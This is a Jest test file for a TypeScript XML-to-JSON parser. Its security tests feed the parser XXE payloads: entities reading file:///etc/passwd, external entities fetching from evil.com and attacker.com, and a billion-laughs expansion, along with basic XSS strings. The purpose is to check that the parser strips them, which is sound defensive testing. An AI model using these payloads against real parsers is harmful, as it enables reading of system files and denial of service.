import { parseXMLToJSON, ParsedXMLData } from '../../../lib/xml-parser'

describe('XML Parser Module', () => {
  describe('parseXMLToJSON', () => {
    describe('Happy Path', () => {
      it('should parse valid XML with single row', () => {
        // Arrange
        const validXML = `
          <resultset>
            <row>
              <name>John Doe</name>
              <age>30</age>
              <salary>50000</salary>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(validXML, 'Employee Data')

        // Assert
        expect(result.data).toHaveLength(1)
        expect(result.data[0]).toEqual({
          name: 'John Doe',
          age: 30,
          salary: 50000
        })
        expect(result.fieldOrder).toEqual(['name', 'age', 'salary'])
        expect(result.message).toBe('Successfully processed 1 rows for Employee Data')
      })

      it('should parse valid XML with multiple rows', () => {
        // Arrange
        const validXML = `
          <resultset>
            <row>
              <product>Widget A</product>
              <quantity>100</quantity>
              <price>25.99</price>
            </row>
            <row>
              <product>Widget B</product>
              <quantity>200</quantity>
              <price>19.99</price>
            </row>
            <row>
              <product>Widget C</product>
              <quantity>150</quantity>
              <price>35.50</price>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(validXML)

        // Assert
        expect(result.data).toHaveLength(3)
        expect(result.data[0]).toEqual({
          product: 'Widget A',
          quantity: 100,
          price: 25.99
        })
        expect(result.data[1]).toEqual({
          product: 'Widget B',
          quantity: 200,
          price: 19.99
        })
        expect(result.data[2]).toEqual({
          product: 'Widget C',
          quantity: 150,
          price: 35.50
        })
        expect(result.fieldOrder).toEqual(['product', 'quantity', 'price'])
        expect(result.message).toBe('Successfully processed 3 rows')
      })

      it('should preserve field order from first row', () => {
        // Arrange
        const xmlWithSpecificOrder = `
          <resultset>
            <row>
              <z_last>Last Field</z_last>
              <a_first>First Field</a_first>
              <m_middle>Middle Field</m_middle>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithSpecificOrder)

        // Assert
        expect(result.fieldOrder).toEqual(['z_last', 'a_first', 'm_middle'])
        expect(Object.keys(result.data[0])).toEqual(['z_last', 'a_first', 'm_middle'])
      })

      it('should handle mixed data types correctly', () => {
        // Arrange
        const mixedDataXML = `
          <resultset>
            <row>
              <name>Alice</name>
              <age>25</age>
              <height>5.6</height>
              <active>true</active>
              <notes></notes>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(mixedDataXML)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Alice',        // First field stays string
          age: 25,              // Parsed as number
          height: 5.6,          // Parsed as number
          active: 'true',       // Non-numeric stays string
          notes: ''             // Empty string
        })
      })

      it('should handle XML with comments and processing instructions', () => {
        // Arrange
        const xmlWithComments = `
          <?xml version="1.0" encoding="UTF-8"?>
          <!-- This is a comment -->
          <resultset>
            <!-- Row data starts here -->
            <row>
              <name>Test User</name>
              <value>123</value>
            </row>
            <!-- End of data -->
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithComments)

        // Assert
        expect(result.data).toHaveLength(1)
        expect(result.data[0]).toEqual({
          name: 'Test User',
          value: 123
        })
      })

      it('should handle XML with whitespace and trim values', () => {
        // Arrange
        const xmlWithWhitespace = `
          <resultset>
            <row>
              <name>  John Doe  </name>
              <description>   A test user   </description>
              <amount>  100.50  </amount>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithWhitespace)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'John Doe',
          description: 'A test user',
          amount: 100.50
        })
      })
    })

    describe('Security Tests - XXE Prevention', () => {
      it('should remove DOCTYPE declarations', () => {
        // Arrange
        const maliciousXML = `
          <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
          ]>
          <resultset>
            <row>
              <name>&xxe;</name>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(maliciousXML)

        // Assert
        expect(result.data[0].name).toBe('')  // Entity reference removed
        expect(result.data[0].value).toBe(123)
      })

      it('should remove entity declarations', () => {
        // Arrange
        const xmlWithEntities = `
          <!ENTITY test "malicious content">
          <!ENTITY external SYSTEM "http://evil.com/malicious.dtd">
          <resultset>
            <row>
              <name>Safe Name</name>
              <value>456</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithEntities)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Safe Name',
          value: 456
        })
      })

      it('should remove all entity references', () => {
        // Arrange
        const xmlWithEntityRefs = `
          <resultset>
            <row>
              <name>John &amp; Jane</name>
              <description>&lt;script&gt;alert('xss')&lt;/script&gt;</description>
              <value>&custom_entity;</value>
              <amount>100</amount>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithEntityRefs)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'John  Jane',           // Entity refs removed
          description: 'scriptalert(\'xss\')/script',  // Entity refs removed
          value: '',                    // Custom entity removed
          amount: 100
        })
      })

      it('should handle billion laughs attack prevention', () => {
        // Arrange
        const billionLaughsAttempt = `
          <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          ]>
          <resultset>
            <row>
              <name>Test</name>
              <data>&lol3;</data>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(billionLaughsAttempt)

        // Assert
        expect(result.data[0].data).toBe('')  // Entity expansion prevented
        expect(result.data[0].name).toBe('Test')
      })

      it('should prevent external entity loading', () => {
        // Arrange
        const externalEntityXML = `
          <!DOCTYPE root [
            <!ENTITY external SYSTEM "http://attacker.com/malicious.xml">
            <!ENTITY file SYSTEM "file:///etc/passwd">
          ]>
          <resultset>
            <row>
              <name>&external;</name>
              <password>&file;</password>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(externalEntityXML)

        // Assert
        expect(result.data[0]).toEqual({
          name: '',       // External entity blocked
          password: '',   // File entity blocked
          value: 123
        })
      })
    })

    describe('Error Cases', () => {
      it('should reject null input', () => {
        // Act & Assert
        expect(() => parseXMLToJSON(null as any)).toThrow('XML parsing failed: Invalid XML content provided')
      })

      it('should reject undefined input', () => {
        // Act & Assert
        expect(() => parseXMLToJSON(undefined as any)).toThrow('XML parsing failed: Invalid XML content provided')
      })

      it('should reject empty string input', () => {
        // Act & Assert
        expect(() => parseXMLToJSON('')).toThrow('XML parsing failed: Invalid XML content provided')
      })

      it('should reject non-string input', () => {
        // Act & Assert
        expect(() => parseXMLToJSON(123 as any)).toThrow('XML parsing failed: Invalid XML content provided')
        expect(() => parseXMLToJSON({} as any)).toThrow('XML parsing failed: Invalid XML content provided')
        expect(() => parseXMLToJSON([] as any)).toThrow('XML parsing failed: Invalid XML content provided')
      })

      it('should reject XML content that is too large', () => {
        // Arrange
        const largeXML = 'a'.repeat(11 * 1024 * 1024) // 11MB

        // Act & Assert
        expect(() => parseXMLToJSON(largeXML)).toThrow('XML parsing failed: XML content too large (max 10MB)')
      })

      it('should handle malformed XML gracefully', () => {
        // Arrange
        const malformedXML = `
          <resultset>
            <row>
              <name>John</name>
              <age>30
            </row>
          </resultset>
        `

        // Act & Assert
        expect(() => parseXMLToJSON(malformedXML)).toThrow('XML parsing failed:')
      })

      it('should reject XML without resultset', () => {
        // Arrange
        const xmlWithoutResultset = `
          <data>
            <row>
              <name>John</name>
            </row>
          </data>
        `

        // Act & Assert
        expect(() => parseXMLToJSON(xmlWithoutResultset)).toThrow('XML parsing failed: No resultset found in XML')
      })

      it('should reject XML without rows', () => {
        // Arrange
        const xmlWithoutRows = `
          <resultset>
          </resultset>
        `

        // Act & Assert
        expect(() => parseXMLToJSON(xmlWithoutRows)).toThrow('XML parsing failed: No row found in XML to determine field order')
      })

      it('should reject XML with empty rows', () => {
        // Arrange
        const xmlWithEmptyRows = `
          <resultset>
            <row></row>
          </resultset>
        `

        // Act & Assert
        expect(() => parseXMLToJSON(xmlWithEmptyRows)).toThrow('XML parsing failed: No fields found in first row')
      })

      it('should handle row with no valid fields', () => {
        // Arrange
        const xmlWithInvalidFields = `
          <resultset>
            <row>
              <!-- Only comments -->
            </row>
          </resultset>
        `

        // Act & Assert
        expect(() => parseXMLToJSON(xmlWithInvalidFields)).toThrow('XML parsing failed: No fields found in first row')
      })
    })

    describe('Security Edge Cases', () => {
      it('should prevent script tag injection', () => {
        // Arrange
        const xmlWithScript = `
          <resultset>
            <row>
              <name>John</name>
              <script>alert('xss')</script>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithScript)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'John',
          value: 123
          // script tag should be blocked/ignored
        })
      })

      it('should handle nested XML structures safely', () => {
        // Arrange
        const nestedXML = `
          <resultset>
            <row>
              <name>Test</name>
              <data>
                <nested>
                  <deep>value</deep>
                </nested>
              </data>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(nestedXML)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Test',
          data: expect.any(Object), // Nested structure parsed
          value: 123
        })
      })

      it('should limit field processing to prevent DoS', () => {
        // Arrange - Create XML with many fields (over the 100 field limit)
        const manyFields = Array.from({ length: 150 }, (_, i) => 
          `<field${i}>value${i}</field${i}>`
        ).join('')
        
        const xmlWithManyFields = `
          <resultset>
            <row>
              ${manyFields}
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithManyFields)

        // Assert
        expect(result.fieldOrder.length).toBeLessThanOrEqual(100)
        expect(Object.keys(result.data[0]).length).toBeLessThanOrEqual(100)
      })

      it('should handle special characters safely', () => {
        // Arrange
        const xmlWithSpecialChars = `
          <resultset>
            <row>
              <name>John "Doe" &lt;Admin&gt;</name>
              <emoji>🚀💻🔒</emoji>
              <unicode>Café naïve résumé</unicode>
              <symbols>!@#$%^*()_+-=[]{}|;:,.<>?</symbols>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithSpecialChars)

        // Assert
        expect(result.data[0].name).toContain('John "Doe"') // Quotes preserved
        expect(result.data[0].emoji).toBe('🚀💻🔒')
        expect(result.data[0].unicode).toBe('Café naïve résumé')
        expect(result.data[0].symbols).toBe('!@#$%^*()_+-=[]{}|;:,.<>?')
      })

      it('should handle CDATA sections safely', () => {
        // Arrange
        const xmlWithCDATA = `
          <resultset>
            <row>
              <name>John</name>
              <description><![CDATA[<script>alert('xss')</script>]]></description>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xmlWithCDATA)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'John',
          description: expect.any(String), // CDATA content handled
          value: 123
        })
        // Should not contain actual script execution
        expect(result.data[0].description).not.toContain('<script>')
      })
    })

    describe('Data Type Processing', () => {
      it('should keep first column as string (key column)', () => {
        // Arrange
        const xml = `
          <resultset>
            <row>
              <id>123</id>
              <name>John</name>
              <age>30</age>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xml)

        // Assert
        expect(result.data[0].id).toBe('123')  // First column stays string
        expect(result.data[0].age).toBe(30)    // Other numeric columns parsed
        expect(typeof result.data[0].id).toBe('string')
        expect(typeof result.data[0].age).toBe('number')
      })

      it('should parse numbers in non-first columns', () => {
        // Arrange
        const xml = `
          <resultset>
            <row>
              <name>Product A</name>
              <price>29.99</price>
              <quantity>100</quantity>
              <available>true</available>
              <rating>4.5</rating>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xml)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Product A',     // First column: string
          price: 29.99,          // Number parsed
          quantity: 100,         // Integer parsed
          available: 'true',     // Non-numeric string
          rating: 4.5            // Float parsed
        })
      })

      it('should handle zero and negative numbers', () => {
        // Arrange
        const xml = `
          <resultset>
            <row>
              <item>Test Item</item>
              <zero>0</zero>
              <negative>-50.75</negative>
              <positive>+25.5</positive>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xml)

        // Assert
        expect(result.data[0]).toEqual({
          item: 'Test Item',
          zero: 0,
          negative: -50.75,
          positive: 25.5  // + sign handled
        })
      })

      it('should handle scientific notation', () => {
        // Arrange
        const xml = `
          <resultset>
            <row>
              <name>Scientific</name>
              <large>1.23e10</large>
              <small>4.56e-5</small>
              <standard>1000000</standard>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(xml)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Scientific',
          large: 1.23e10,
          small: 4.56e-5,
          standard: 1000000
        })
      })
    })

    describe('Performance and Limits', () => {
      it('should handle maximum allowed XML size efficiently', () => {
        // Arrange
        const maxSize = 10 * 1024 * 1024 - 1000 // Just under 10MB
        const largeContent = 'x'.repeat(maxSize - 200) // Leave room for XML structure
        const largeXML = `
          <resultset>
            <row>
              <name>Large Content</name>
              <content>${largeContent}</content>
              <value>123</value>
            </row>
          </resultset>
        `

        // Act
        const startTime = performance.now()
        const result = parseXMLToJSON(largeXML)
        const endTime = performance.now()

        // Assert
        expect(result.data).toHaveLength(1)
        expect(result.data[0].name).toBe('Large Content')
        expect(endTime - startTime).toBeLessThan(5000) // Should complete within 5 seconds
      })

      it('should handle many rows efficiently', () => {
        // Arrange
        const rowCount = 1000
        const rows = Array.from({ length: rowCount }, (_, i) => `
          <row>
            <id>item_${i}</id>
            <value>${i * 2}</value>
            <active>${i % 2 === 0}</active>
          </row>
        `).join('')

        const manyRowsXML = `
          <resultset>
            ${rows}
          </resultset>
        `

        // Act
        const startTime = performance.now()
        const result = parseXMLToJSON(manyRowsXML, 'Performance Test')
        const endTime = performance.now()

        // Assert
        expect(result.data).toHaveLength(rowCount)
        expect(result.data[0]).toEqual({
          id: 'item_0',
          value: 0,
          active: 'true'
        })
        expect(result.data[rowCount - 1]).toEqual({
          id: `item_${rowCount - 1}`,
          value: (rowCount - 1) * 2,
          active: 'false'
        })
        expect(result.message).toBe(`Successfully processed ${rowCount} rows for Performance Test`)
        expect(endTime - startTime).toBeLessThan(3000) // Should complete within 3 seconds
      })
    })

    describe('Edge Cases and Real-world Scenarios', () => {
      it('should handle inconsistent field presence across rows', () => {
        // Arrange
        const inconsistentXML = `
          <resultset>
            <row>
              <name>Row 1</name>
              <value1>100</value1>
              <value2>200</value2>
            </row>
            <row>
              <name>Row 2</name>
              <value1>300</value1>
              <!-- value2 missing -->
            </row>
            <row>
              <name>Row 3</name>
              <!-- value1 missing -->
              <value2>400</value2>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(inconsistentXML)

        // Assert
        expect(result.data).toHaveLength(3)
        expect(result.data[0]).toEqual({ name: 'Row 1', value1: 100, value2: 200 })
        expect(result.data[1]).toEqual({ name: 'Row 2', value1: 300, value2: '' })
        expect(result.data[2]).toEqual({ name: 'Row 3', value1: '', value2: 400 })
      })

      it('should handle real-world financial data format', () => {
        // Arrange
        const financialXML = `
          <resultset>
            <row>
              <account_id>ACC001</account_id>
              <balance>1250.75</balance>
              <currency>USD</currency>
              <last_updated>2024-01-15</last_updated>
            </row>
            <row>
              <account_id>ACC002</account_id>
              <balance>-500.25</balance>
              <currency>EUR</currency>
              <last_updated>2024-01-16</last_updated>
            </row>
          </resultset>
        `

        // Act
        const result = parseXMLToJSON(financialXML, 'Financial Report')

        // Assert
        expect(result.data).toHaveLength(2)
        expect(result.data[0]).toEqual({
          account_id: 'ACC001',        // String (first column)
          balance: 1250.75,            // Number
          currency: 'USD',             // String (non-numeric)
          last_updated: '2024-01-15'   // String (non-numeric)
        })
        expect(result.data[1]).toEqual({
          account_id: 'ACC002',
          balance: -500.25,            // Negative number
          currency: 'EUR',
          last_updated: '2024-01-16'
        })
      })

      it('should handle XML with namespace prefixes', () => {
        // Arrange
        const namespacedXML = `
          <ns:resultset xmlns:ns="http://example.com/namespace">
            <ns:row>
              <ns:name>Namespaced Data</ns:name>
              <ns:value>456</ns:value>
            </ns:row>
          </ns:resultset>
        `

        // Act
        const result = parseXMLToJSON(namespacedXML)

        // Assert
        expect(result.data[0]).toEqual({
          name: 'Namespaced Data',  // Namespace prefixes removed
          value: 456
        })
      })
    })
  })
})